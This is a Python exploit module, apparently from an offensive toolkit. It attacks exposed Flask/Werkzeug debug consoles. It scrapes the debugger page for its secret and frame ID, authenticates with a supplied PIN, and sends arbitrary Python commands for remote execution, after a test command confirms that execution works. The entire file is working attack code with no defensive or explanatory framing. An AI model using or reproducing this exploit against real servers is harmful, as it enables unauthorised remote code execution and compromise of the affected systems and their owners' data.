'''
name : Flask Debugger Command execution
description : This module performs a command execution via flask debug bar.
version : 1.1
author : Ayato
'''

import re
import requests
import bs4

def get_secret_and_frame(url, user_agent):
    print("[*] Getting secret and frame_id")
    headers = {
        "User-Agent": f"{user_agent}"
    }
    try:
        session = requests.Session()
        res = session.get(
            url = url,
            headers=headers
        )
        # if res.status_code != 200:
        #    print(f"[-] Could not access {url}")
        #    return False, False, False
        soup = bs4.BeautifulSoup(res.text, 'html.parser')
        frame_id = soup.find('div', {'class': 'frame'})['id'].replace('frame-', '')
        secret = re.search(r'SECRET\s*=\s*"([^"]+)"', res.text)[1]
        print(f"[*] Found secret: {secret}")
        print(f"[*] Found frame_id: {frame_id}")
        return session, secret, frame_id
    except Exception as e:
        print(f"[-] Error: {e}")
        return False, False, False

def generate_cookie(session, url, pin, secret, user_agent):
    print(f"[*] Trying generate Auth cookie with PIN {pin}")
    url = f"{url}?__debugger__=yes&cmd=pinauth&pin={pin}&s={secret}"
    headers = {
        "User-Agent": f"{user_agent}"
    }
    try:
        res = session.get(
            url = url,
            headers=headers
        )
        if '"auth": true' in res.text:
            print(f"[+] Got Auth cookie with PIN {pin}")
            return session
        else:
            print(f"[-] Could not get cookie with PIN {pin}")
            return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def run_command(session, url, secret, frame, user_agent, command):
    print(f"[*] Trying execute commands")
    url = f"{url}?&__debugger__=yes&cmd={command}&frm={frame}&s={secret}"
    headers = {
        "User-Agent": f"{user_agent}"
    }
    try:
        res = session.get(
            url = url,
            headers=headers
        )
        print(f"[*] Command '{command[:50]} ...' was executed")
        return res.text
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def try_exec(url, user_agent, pin, python_cmd):
    session, secret, frame = get_secret_and_frame(url, user_agent)
    if session == False:
        return False
    session = generate_cookie(session, url, pin, secret, user_agent)
    if session == False:
        return False
    res = run_command(session, url, secret, frame, user_agent, python_cmd)
    return res

def run(ip, port, uri, pin, python_cmd, user_agent):
    print("[*] Running command exec via Flask debugger...")
    url = f"http://{ip}:{port}{uri}"
    res = try_exec(url, user_agent, pin, "print('exec_check_ok')")
    if res:
        if 'exec_check_ok' in res:
            print("[+] Exec check success")
            res = try_exec(url, user_agent, pin, python_cmd)
            print(f"[+] Command executed")
            return 0
        else:
            print(f"[-] Command execute failed")
            return -1
    else:
        return -1